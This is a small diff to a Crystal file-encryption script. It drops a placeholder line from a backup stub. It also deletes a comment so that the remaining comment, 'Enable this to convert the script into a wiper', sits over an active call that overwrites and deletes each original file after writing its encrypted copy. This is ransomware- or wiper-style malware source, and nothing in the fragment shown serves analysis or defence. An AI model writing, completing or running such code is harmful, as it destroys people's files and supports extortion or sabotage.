@@ -3,7 +3,6 @@ require "concurrent"
 
 # Placeholder for the backup function
 def backup_files(file_paths : Array(String))
-  puts "Placeholder for backup logic. Implement backup of files here."
   # Backup logic here.
 end
 
@@ -30,7 +29,6 @@ def safely_process(file_path : String, public_key_path : String)
       File.write("#{file_path}.enc", encrypted_data)
     end
 
-    # Securely delete original file after encryption
     # Enable this to convert the script into a wiper:
     overwrite_and_delete(file_path)
   rescue
